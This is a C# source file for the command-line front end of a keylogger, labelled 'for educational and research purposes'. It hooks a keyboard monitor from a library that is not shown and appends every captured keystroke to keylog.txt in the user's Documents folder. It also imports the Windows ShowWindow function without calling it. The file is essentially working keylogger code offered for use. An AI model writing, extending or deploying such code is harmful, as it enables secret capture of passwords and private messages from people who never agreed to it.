using System;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using Keylogger.Core.InputMonitoring;

namespace Keylogger.CLI
{
    /// <summary>
    /// Command line interface for the keylogger educational project
    /// For research and educational purposes only
    /// </summary>
    internal class Program
    {
        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private static readonly string DefaultLogPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            "keylog.txt");
            
        private static string _logPath;
        private static KeyboardMonitor _keyboardMonitor;
        
        static void Main(string[] args)
        {
            // Initialize components
            _logPath = DefaultLogPath;
            _keyboardMonitor = new KeyboardMonitor();
            
            // Check command line arguments
            if (args.Length > 0)
            {
                if (args[0].ToLower() == "-help" || args[0].ToLower() == "--help" || args[0] == "/?")
                {
                    ShowHelp();
                    return;
                }
            }

            Console.WriteLine("Keylogger started for educational purposes.");
            Console.WriteLine($"Logging to: {_logPath}");

            // Create log file and add header
            using (StreamWriter sw = File.AppendText(_logPath))
            {
                sw.WriteLine($"=== Keylogger Started: {DateTime.Now} ===");
            }

            // Wire up event handler
            _keyboardMonitor.KeyPressed += KeyboardMonitor_KeyPressed;

            // Start monitoring
            _keyboardMonitor.Start();

            // Keep the application running
            Console.WriteLine("Press ESC to stop monitoring");
            while (true)
            {
                if (Console.KeyAvailable)
                {
                    var key = Console.ReadKey(true);
                    if (key.Key == ConsoleKey.Escape)
                    {
                        break;
                    }
                }
                
                Thread.Sleep(100);
            }

            // Clean up and exit
            _keyboardMonitor.Stop();
            
            Console.WriteLine("Keylogger stopped");
        }

        private static void KeyboardMonitor_KeyPressed(object sender, KeyPressEventArgs e)
        {
            LogKeypress(e.KeyText);
        }

        private static void LogKeypress(string key)
        {
            try
            {
                // Write to file
                using (StreamWriter sw = File.AppendText(_logPath))
                {
                    sw.Write(key);
                }

                // For research/debug, show the output
                Console.Write(key);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error logging keypress: {ex.Message}");
            }
        }

        static void ShowHelp()
        {
            Console.WriteLine("Basic Keylogger Tool");
            Console.WriteLine("For educational and security research purposes only");
            Console.WriteLine();
            Console.WriteLine("Usage:");
            Console.WriteLine("  KeyloggerLabs.exe        - Start keylogging");
            Console.WriteLine("  KeyloggerLabs.exe -help  - Show this help message");
        }
    }
}